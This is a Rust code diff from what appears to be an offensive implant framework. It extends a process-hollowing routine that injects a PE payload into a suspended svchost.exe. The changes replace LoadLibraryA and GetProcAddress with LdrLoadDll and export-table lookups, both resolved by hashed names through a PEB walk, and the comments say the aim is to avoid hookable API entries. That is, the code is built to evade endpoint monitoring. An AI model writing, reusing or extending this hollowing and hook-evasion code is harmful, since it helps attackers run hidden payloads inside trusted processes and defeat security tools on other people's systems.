@@ -62,6 +62,90 @@ unsafe fn rva_to_file_offset(
     rva_to_file_offset_sections(rva, &descs)
 }
 
+/// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
+/// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
+/// failure, in which case the caller leaves the corresponding IAT slot empty.
+#[cfg(windows)]
+unsafe fn ldr_load_local(dll_name: &str) -> usize {
+    let ntdll = match pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_str(b"ntdll.dll\0"),
+    ) {
+        Some(b) => b,
+        None => return 0,
+    };
+    let ldr_addr = match pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"LdrLoadDll\0"),
+    ) {
+        Some(a) => a,
+        None => return 0,
+    };
+    type LdrLoadDllFn = unsafe extern "system" fn(
+        *mut u16,
+        *mut u32,
+        *mut winapi::shared::ntdef::UNICODE_STRING,
+        *mut *mut winapi::ctypes::c_void,
+    ) -> i32;
+    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_addr as *const ());
+
+    let wide: Vec<u16> = dll_name
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
+    let mut us: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+    us.Length = ((wide.len().saturating_sub(1)) * 2) as u16;
+    us.MaximumLength = (wide.len() * 2) as u16;
+    us.Buffer = wide.as_ptr() as *mut _;
+    let mut base_out: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+    let status = ldr_load_dll(
+        std::ptr::null_mut(),
+        std::ptr::null_mut(),
+        &mut us,
+        &mut base_out,
+    );
+    if status >= 0 {
+        base_out as usize
+    } else {
+        0
+    }
+}
+
+/// M-26 Part E: resolve an export by ordinal from a clean module image.
+/// Mirrors `agent::syscalls::get_export_addr_by_ordinal` so the hollowing
+/// crate doesn't need to depend on agent or call hooked GetProcAddress.
+#[cfg(windows)]
+unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
+    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+        return std::ptr::null_mut();
+    }
+    let nt_headers = (base + (*dos_header).e_lfanew as usize)
+        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory
+        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+        .VirtualAddress;
+    if export_dir_rva == 0 {
+        return std::ptr::null_mut();
+    }
+    let ed =
+        (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+    let base_ordinal = (*ed).Base;
+    let num_funcs = (*ed).NumberOfFunctions;
+    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
+    if ordinal < base_ordinal {
+        return std::ptr::null_mut();
+    }
+    let idx = (ordinal - base_ordinal) as usize;
+    if idx >= num_funcs as usize {
+        return std::ptr::null_mut();
+    }
+    let func_rva = *funcs.add(idx) as usize;
+    if func_rva == 0 {
+        return std::ptr::null_mut();
+    }
+    (base + func_rva) as *mut std::ffi::c_void
+}
+
 /// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
 #[cfg(windows)]
 pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
@@ -705,7 +789,6 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
     written: &mut winapi::shared::basetsd::SIZE_T,
 ) -> Result<()> {
-    use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
     use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
     use winapi::um::synchapi::WaitForSingleObject;
     use winapi::um::winbase::INFINITE;
@@ -854,10 +937,10 @@ unsafe fn fix_iat_remote(
                     winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_name, 0, MEM_RELEASE);
                 }
             }
-            // Now load locally — the preferred base will be established in the
-            // target already so our function-address lookups match.
-            let hmod = LoadLibraryA(dll_name_lower.as_ptr() as _);
-            hmod as usize
+            // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
+            // instead of the hookable LoadLibraryA IAT entry.
+            let hmod = ldr_load_local(dll_name_str);
+            hmod
         };
 
         if dll_base == 0 {
@@ -885,10 +968,18 @@ unsafe fn fix_iat_remote(
             }
 
             let func_addr: usize = if thunk_val & (1u64 << 63) != 0 {
-                // Ordinal import
-                let ord = (thunk_val & 0xFFFF) as usize;
-                let ep = GetProcAddress(dll_base as _, ord as _);
-                ep as usize
+                // Ordinal import: M-26 — resolve via clean export-table walk.
+                let ord = (thunk_val & 0xFFFF) as u32;
+                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
+                if ep.is_null() {
+                    tracing::warn!(
+                        "fix_iat_remote: ordinal {} in {} unresolved (refusing GetProcAddress fallback)",
+                        ord, dll_name_str
+                    );
+                    0
+                } else {
+                    ep as usize
+                }
             } else {
                 // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                 let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
@@ -907,10 +998,19 @@ unsafe fn fix_iat_remote(
                 let mut name_null = name_bytes[..nlen].to_vec();
                 name_null.push(0);
                 let hash = pe_resolve::hash_str(&name_null);
-                pe_resolve::get_proc_address_by_hash(dll_base, hash).unwrap_or_else(|| {
-                    let ep = GetProcAddress(dll_base as _, name_null.as_ptr() as _);
-                    ep as usize
-                })
+                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
+                    Some(addr) => addr,
+                    None => {
+                        tracing::warn!(
+                            "fix_iat_remote: {}!{} unresolved via PEB walk, leaving IAT slot empty (M-26)",
+                            dll_name_str,
+                            String::from_utf8_lossy(
+                                &name_null[..name_null.len().saturating_sub(1)]
+                            )
+                        );
+                        0
+                    }
+                }
             };
 
             if func_addr != 0 {
